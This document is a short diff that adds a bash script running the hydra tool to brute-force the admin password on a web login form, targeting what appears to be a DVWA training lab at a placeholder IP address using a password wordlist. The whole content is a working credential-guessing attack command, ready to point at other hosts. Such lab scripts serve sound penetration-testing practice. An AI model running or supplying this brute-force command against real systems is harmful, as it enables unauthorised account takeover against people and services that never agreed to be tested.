@@ -1,1 +1,2 @@
-
+#!/bin/bash
+hydra -l admin -P wordlists/passwords.txt <IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
